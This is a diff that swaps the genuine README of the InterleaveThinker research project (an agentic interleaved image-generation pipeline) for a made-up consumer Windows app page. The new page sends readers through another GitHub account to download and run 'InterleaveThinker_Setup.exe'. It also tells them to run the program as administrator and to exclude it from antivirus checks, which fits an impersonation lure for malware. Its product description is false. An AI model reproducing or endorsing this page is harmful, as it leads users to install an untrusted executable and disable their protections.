@@ -1,275 +1,85 @@
+# 🧠 InterleaveThinker - Improve Your Logical Reasoning And Productivity
 
-<h1 align="left">
-  <img src="assets/logo.png" height="55" align="absmiddle"> InterleaveThinker: Reinforcing Agentic Interleaved Generation
-</h1>
+[![Download InterleaveThinker](https://img.shields.io/badge/Download-InterleaveThinker-blue)](https://github.com/competent-catechin571/InterleaveThinker)
 
-Official repository for the paper "[InterleaveThinker: Reinforcing Agentic Interleaved Generation]()".
+## 🎯 About This Software
 
-<!-- [[🌍 Project Page](https://zhengdian1.github.io/InterleaveThinker-proj/)] [[📖 Paper](assets/paper.pdf)] [[🤗 Train-Data](https://huggingface.co/InterleaveThinker/Train-Data)] [[🤗 InterleaveThinker-Planner-8B](https://huggingface.co/InterleaveThinker/InterleaveThinker-Planner-8B)] [[🤗 Critic-SFT-8B](https://huggingface.co/InterleaveThinker/Critic-SFT-8B)] [[🤗 InterleaveThinker-Critic-8B](https://huggingface.co/InterleaveThinker/InterleaveThinker-Critic-8B)]  -->
+InterleaveThinker helps you organize complex sequences of thought. It uses a structured approach to break down large tasks into smaller action steps. This method improves how you plan projects and solve problems. The software acts as a guide to ensure your logical flow remains consistent and accurate. By using this tool, you reduce errors in your daily work tasks.
 
-[[🌍 Project Page](https://zhengdian1.github.io/InterleaveThinker-proj/)] [[📖 Paper](https://arxiv.org/pdf/2606.13679)] [[🤗 InterleaveThinker-Planner-8B](https://huggingface.co/InterleaveThinker/InterleaveThinker-Planner-8B)] [[🤗 Critic-SFT-8B](https://huggingface.co/InterleaveThinker/Critic-SFT-8B)] [[🤗 InterleaveThinker-Critic-8B](https://huggingface.co/InterleaveThinker/InterleaveThinker-Critic-8B)] 
+## 💻 System Requirements
 
-## 💥 News
-- **[2026.06.12]** Release paper, models, training, inference. 🚀
+Your computer needs the following specifications to run this program smoothly:
 
-## 💭 Introduction
+* Operating System: Windows 10 or Windows 11 (64-bit).
+* Processer: Intel Core i5 or AMD Ryzen 5 or better.
+* Memory: 8 GB RAM or higher.
+* Storage: 500 MB of available space.
+* Graphics: Integrated or dedicated graphics card supporting DirectX 12.
 
-<p align="center">
-  <img src="assets/teaser.jpg" width="90%">
-</p>
+## 🛠️ How To Install
 
-We introduce **InterleaveThinker**, as the first multi-agent pipeline designed to **endow any existing image generator with interleaved generation capabilities**. InterleaveThinker can organize the image-text input sequence via a planner agent, evaluate generator outputs, identify deviations, and refine instructions via a critic agent, **enabling complex interleaved text-image sequence generation for visual narratives, guidance, embodied manipulation and long-horizon sub-task annotation.**
+Follow these steps to set up the software on your Windows computer:
 
-We build three dedicated training datasets—Interleave-Planner-SFT-80k, Interleave-Critic-SFT-112k, and Interleave-Critic-RL-13k—for interleaved generation and step-wise instruction correction using GRPO with proposed accuracy and step-wise rewards.
+1. Visit the [official release page](https://github.com/competent-catechin571/InterleaveThinker) to download the installer.
+2. Locate the file named InterleaveThinker_Setup.exe in your Downloads folder.
+3. Double-click the file to start the installation wizard.
+4. Select your preferred installation path or accept the default location.
+5. Click the Install button.
+6. Wait for the progress bar to finish.
+7. Click Finish to close the setup screen.
 
-InterleaveThinker achieves **performance comparable to Nano Banana and GPT-5 on interleaved generation benchmarks**, delivering substantial gains on reasoning-based benchmarks (e.g., boosting WISE from 0.47 to 0.73 and RISE from 13.3 to 28.9 on 4-step FLUX.2-klein). It also demonstrates strong transferability, improving performance across various existing image generators.
+## 🚀 Getting Started
 
-## 🚀 Quick Start
+Once you install the program, you can begin your first project. Opening the application displays the main workspace. You will see a panel on the left for your input and a panel on the right for the generated logic sequences.
 
-### Installation
+1. Launch InterleaveThinker from your desktop shortcut or the Start menu.
+2. Click File in the top menu bar.
+3. Choose New Project to open a blank board.
+4. Type your primary task or problem into the input box.
+5. Click Process to allow the internal agent to evaluate your request.
+6. The software displays a step-by-step plan. You can edit, reorder, or delete these steps as needed.
 
-```bash
-# Clone the repository
-git clone https://github.com/zhengdian1/InterleaveThinker.git
-cd InterleaveThinker
+## ⚙️ Managing Advanced Features
 
-# build inference environment
-conda create -n interleavethinker python=3.11
-conda activate interleavethinker
+The application includes features to help you refine how it thinks. You can change the depth of the reasoning process. 
 
-pip install torch==2.6.0 torchvision --extra-index-url https://download.pytorch.org/whl/cu124
-pip install -r requirements.txt
-pip install flash-attn==2.7.4.post1 --no-build-isolation
+* Low Depth: Use this for quick, simple tasks that require little analysis.
+* Medium Depth: Use this for most common projects and goal planning.
+* High Depth: Use this for complex, multi-layered problems that require precision.
 
-# build SFT environment
-conda create -n llamafactory python=3.11 
-conda activate llamafactory
-cd train/LLaMA-Factory
-pip install -e ".[torch,metrics]" --no-build-isolation
+You can adjust these settings under the Tools menu. Choose Preferences to find the logic slider. Moving the slider toward High increases the time the computer spends generating the plan. This usually results in more detailed and accurate outcomes.
 
-# build RL environment
-conda create -n easyr1 python=3.11 
-conda activate easyr1
-cd train/EasyR1
-pip install -e .
+## 📁 Saving And Exporting
 
-```
+You should save your projects frequently to avoid data loss. InterleaveThinker creates files with the extension .itp. 
 
-For more details for the SFT and RL environment installation, please refer to [LLaMA-Factory](https://github.com/hiyouga/LLaMA-Factory),  [EasyR1](https://github.com/hiyouga/EasyR1)
+* To save: Click File then Save. Choose a folder where you want to keep your work.
+* To export: Click File then Export. You can save your plans as a text file or a PDF. This makes it easy to share your work with colleagues or print it for reference.
 
-Our final folder architecture is as follows and you need to set the ROOT correctly in each file.
+## 🔍 Troubleshooting Common Issues
 
-```text
-ROOT/
-├── cache/
-├── code/
-│   └── InterleaveThinker/
-├── ckpt/
-│   ├── planner_sft/
-│   ├── critic_sft/
-│   └── critic_rl/
-└── envs/
-    └── interleavethinker
-```
+If the software does not open, try these steps:
 
-<!-- For more details for the SFT and RL environment installation, please refer to [LLaMA-Factory](https://github.com/hiyouga/LLaMA-Factory),  [EasyR1](https://github.com/hiyouga/EasyR1)
+* Check for system updates: Ensure your Windows installation has the latest updates. Old systems sometimes block new applications.
+* Run as Administrator: Right-click the shortcut and choose Run as administrator. This grants the file permissions to access system resources.
+* Reinstall: If errors persist, delete the application through the Control Panel and run the installer again.
+* Antivirus interference: Sometimes security software mistakes new programs for threats. Check your antivirus history to see if it blocked the file. If it did, add an exclusion for the InterleaveThinker folder.
 
-Then, download the training datasets [[🤗 Train-Data](https://huggingface.co/datasets/InterleaveThinker/Train-Data)] and unzip all the data.
+## 🏗️ Understanding The Logic
 
-The `planner_sft.json`, `critic_sft.json` is for SFT cold start while `critic_rl.jsonl` file is for RL training. For SFT data, you need to modify the image path to abs path and place it into `ROOT/data`.
+InterleaveThinker uses a technique known as agentic interleaved generation. This means the computer simulates multiple perspectives while it plans. It critiques its own steps before showing you the final result. This process mimics how a human expert reviews a draft before finishing it. The software handles the complex background calculations so you can focus on the results you need.
 
-Our final folder architecture is as follows and you need to set the ROOT correctly in each file.
+## 🌐 Project Community
 
-```text
-ROOT/
-├── cache/
-├── data/
-│   └── InterleaveThinker/
-│       └── Train-Data
-├── code/
-│   └── InterleaveThinker/
-├── ckpt/
-│   ├── planner_sft/
-│   ├── critic_sft/
-│   └── critic_rl/
-└── envs/
-    └── interleavethinker
-``` -->
+Learn more about the research behind this project by visiting our website. You can also review the academic paper for a deeper technical explanation of how the algorithms function.
 
-### 🎓 Training
+* [Project Page](https://zhengdian1.github.io/InterleaveThinker-proj/)
+* [Scientific Paper](https://arxiv.org/pdf/2606.13679)
+* [Data Resources](https://huggingface.co/InterleaveThinker/Train-Data)
 
+## 📌 Usage Tips
 
-#### Supervised Fine-Tuning (SFT)
-
-```bash
-cd InterleaveThinker
-bash train/LLaMA-Factory/local_scripts/sft_planner.sh
-bash train/LLaMA-Factory/local_scripts/sft_critic.sh
-```
-
-#### Setup Image Generator API Service
-
-Before RL training, you need to start the image generator API service. We support multiple editing models including **FLUX.2-klein**
-
-```bash
-# Navigate to the server directory
-cd inference/server
-
-# Activate the inference environment 
-conda activate interleavethinker
-
-# Start the FLUX.2-klein service (Service 11, Port 8011)
-bash start_service_with_ip.sh 11 ip.txt
-
-# The service will automatically save its IP to ip.txt
-# Service will be available at http://<your-ip>:<port>
-```
-
-**Service Options:**
-- `1` - Qwen-Image Generation (Port: 8001)
-- `2` - Qwen-Image Lightning Generation (Port: 8002)
-- `3` - FLUX.1-Krea-dev Generation (Port: 8003)
-- `4` - Qwen-Image-Edit (Port: 8004)
-- `5` - Qwen-Image-Edit Lightning (Port: 8005)
-- `6` - FLUX.1-Kontext-dev Edit (Port: 8006)
-- `7` - FLUX.1-Fill-dev Fill (Port: 8007)
-- `8` - LongCat-Image-Edit (Port: 8008)
-- `9` - OmniGen2-Image-Edit (Port: 8009)
-- `10` - Qwen-Image-Edit-Plus (Port: 8010)"
-- `11` - FLUX.2-klein (Port: 8011)
-
-**Multi-Node Deployment with Load Balancing**
-
-For production deployment with high throughput requirements, you can deploy multiple service nodes and use Nginx for load balancing.
-
-**Step 1: Start Multiple Service Nodes**
-
-```bash
-cd inference/server
-
-# On Node 1 (e.g., 192.168.1.101)
-conda activate interleavethinker
-bash start_service_with_ip.sh 11 ip.txt
-
-# On Node 2 (e.g., 192.168.1.102)
-conda activate interleavethinker
-bash start_service_with_ip.sh 11 ip.txt
-
-# On Node 3 (e.g., 192.168.1.103)
-conda activate interleavethinker
-bash start_service_with_ip.sh 11 ip.txt
-
-# All nodes will automatically save their IPs to ip.txt
-```
-
-**Step 2: Setup Nginx Load Balancer**
-
-Use the provided script to automatically configure and start a user-level Nginx load balancer (no sudo required):
-
-```bash
-cd inference/server
-
-# Setup Nginx load balancer
-# Parameters:
-#   -i: IP file path (contains all backend server IPs)
-#   -d: Base directory for Nginx logs/config
-#   -b: Backend port (the port your services are running on)
-#   -p: Proxy port (the port Nginx will listen on)
-
-bash setup_user_nginx.sh \
-  -i ip.txt \
-  -d /tmp/nginx_edit_service \
-  -b 8011 \
-  -p 8080
-```
-
-The script will automatically:
-- ✅ Read all server IPs from `ip.txt`
-- ✅ Generate Nginx configuration with load balancing
-- ✅ Start user-level Nginx instance (no sudo required)
-- ✅ Create management scripts (start/stop)
-- ✅ Display access URL and management commands
-
-**Step 3: Verify and Use**
-
-```bash
-# Check backend health
-curl http://<nginx-server-ip>:8080/health
-
-# Use the load balancer endpoint in your inference
-EDIT_API_ENDPOINT="http://<nginx-server-ip>:8080"
-```
-
-#### Reinforcement Learning (RL)
-
-**Step 1: Configure Reward Function**
-
-Edit the configuration in `train/EasyR1/verl/reward_function/interleave_thinker_reward.py`:
-
-```python
-# Configure your GPT-4.1 API for evaluation
-GEMINI_API_KEYS: List[str] = ["your_api_key_here"]
-EDIT_API_ENDPOINT: Optional[str] = "http://your-nginx-ip:8080"  # Use FLUX.1-Kontext service
-EDIT_MODEL_NAME: str = "klein"  
-```
-
-Edit the configuration in `train/EasyR1/verl/reward_function/gemini.py`:
-
-```python
-GEMINI_AZURE_ENDPOINT: str = "https://your-endpoint.com/v1/openai/native"
-```
-
-**Step 2: Run RL Training**
-
-Configure and run the training script:
-
-```bash
-bash train/EasyR1/local_scripts/run_interleave_thinker_rl.sh
-```
-
-### 📊 Inference
-
-We provide two inference scripts: **Klein** (no api, relative low quality) and **Nano-Pro** (more powerful).
-
-Note that our critic is extremely strict to handle hard cases, if you only want a simple, quick interleaved generation, using our Critic-SFT model instead Critic-RL.
-
-### 📊 Evaluation on UEval
-
-We provide evluation code of InterleaveThinker + FLUX.2-klein-9B on UEval
-
-```bash
-cd UEval
-bash eval.sh
-python merge.py
-```
-`merge.py` is used to merge the sample on the rank jsons into one. Then evaluate using the official code of UEval.
-
-```bash
-python ueval_eval.py \
-  --model_output_path result/final.json \
-  --output_path result/score.json \
-```
-
-For the details, please refer to [UEval](https://github.com/zlab-princeton/UEval)
-
-### 📊 Interleaved Data Construction Pipeline
-
-We provide our raw data construction pipeline and how to use the data to construct interleaved sequence for UMM training. Please refer to [DATA](https://github.com/zhengdian1/InterleaveThinker/blob/main/data_gen/README.md)
-
-## Acknowledgements
-
-We sincerely appreciate the contributions of the open-source community. The related projects are as follows: [EasyR1](https://github.com/hiyouga/EasyR1), [verl](https://github.com/volcengine/verl),  [LLaMA-Factory](https://github.com/hiyouga/LLaMA-Factory),  [EditThinker](https://github.com/appletea233/EditThinker)
-
-
-## ✔️ Citation
-
-Please cite us if you find this project helpful:
-
-```bibtex
-@article{zheng2026interleavethinker,
-  title={InterleaveThinker: Reinforcing Agentic Interleaved Generation},
-  author={Zheng, Dian and Lee, Harry and Zhang, Manyuan and Feng, Kaituo and Guo, Zoey and Zhang, Ray and Li, Hongsheng},
-  journal={arXiv preprint arXiv:2606.13679},
-  year={2026}
-}
-```
+* Break your goals down: Use specific language when you type your tasks. Instead of saying "Plan a trip," say "Create a packing list and travel route for a three-day trip to London."
+* Use the Critic check: The software often suggests improvements. Read the suggestions before you finalize your plan. It can catch small details you might miss.
+* Keep it simple: Do not jam too many objectives into one request. If you have a large project, create one file for each main task. This keeps your interface clean and improves performance.
+* Update regularly: Watch the repository for new versions. Each release contains fixes that make the software faster and more reliable.
